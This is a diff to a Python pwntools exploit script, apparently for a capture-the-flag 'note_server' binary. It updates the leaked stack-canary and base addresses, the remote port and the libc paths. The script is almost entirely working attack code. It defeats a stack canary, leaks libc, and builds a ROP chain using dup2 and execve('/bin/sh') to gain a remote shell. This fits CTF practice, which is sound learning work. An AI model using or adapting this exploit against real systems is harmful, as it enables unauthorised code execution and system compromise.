@@ -4,7 +4,7 @@ from base64 import b64encode,b64decode
 from time import sleep
 
 RHOST = '127.0.0.1'
-RPORT = '5001'
+RPORT = '1339'
 context.arch = 'amd64'
 context.os = 'linux'
 
@@ -59,40 +59,33 @@ r.close()
 ################################################################################
 # SMASH THROUGH CANARY
 ################################################################################
-'''
-r=remote(RHOST,RPORT)
-
-canary = 0x7a117c4776371000
+canary = 0x529adcce455f9300
 b_canary = p64(canary)
 
-base = 0x0000561410c94674
-b_base = p64(base-0x1674)
-
-pad = b'b'*231
-payload = b'\x01\xffaaaabbbb' + b_canary + b_base +pad
-payload += buffer_filler
-payload += buffer_filler
-payload += buffer_filler
-payload += fill
-payload += smash_cpy
-payload += read
-raw = deliver_payload(payload)
-print(raw)
-r.close()
-'''
-
+base = 0x0000562a92d57f54
 ################################################################################
+'''
+BASE + FD3                
+4000000000000000          
+BASE + FD1                
+BASE + 201f88             
+12345678                  
+BASE + 900                
+
+'''
+'''
 # --- leak libc
-canary = 0xfb6204523491cf00
+canary = 0x529adcce455f9300
 b_canary = p64(canary)
-################################################################################
-'''
 
-base = 0x0000559e42d53674
-b_base = p64(base-0x1674).decode('latin-1')
+base = 0x0000562a92d57f54
+#b_base = p64(base-0x1674).decode('latin-1') # local
+b_base = p64(base-0xf54).decode('latin-1') # remote
+################################################################################
 bin_base = u64(b_base)
 
-elf  = ELF("./note_server",checksec=False)
+elf  = ELF("/home/kali/Desktop/note_server",checksec=False)
+#elf  = ELF("./note_server",checksec=False)
 elf.address = bin_base
 rop = ROP(elf)
 
@@ -115,10 +108,9 @@ print(deliver_payload(payload))
 ################################################################################
 # --- shell me
 ################################################################################
-libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.30.so",checksec=False)
-
-
-write = 0x00007f03d5ca7660
+#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.30.so",checksec=False)
+libc  = ELF("/home/kali/libc6_2.27-3ubuntu1_amd64.so",checksec=False)
+write = 0x7ff75c036140
 libc.address = write - libc.symbols['write']
 rop_libc = ROP(libc)
 binsh = next(libc.search("/bin/sh\x00".encode()))
@@ -129,8 +121,9 @@ rop_libc.dup2(0x04,0x01)
 rop_libc.execve(binsh,0x00,0x00)
 chain = rop_libc.chain()
 #print(len(chain)) # 136
+#print(len(chain)) # 128
 
-pad = b'b'*95
+pad = b'b'*103
 payload = b'\x01\xff\x00\x00\x00\x00\x00\x00\x00\x00' + b_canary + b'\x00\x00\x00\x00\x00\x00\x00\x00' + chain
 payload += pad
 payload += buffer_filler
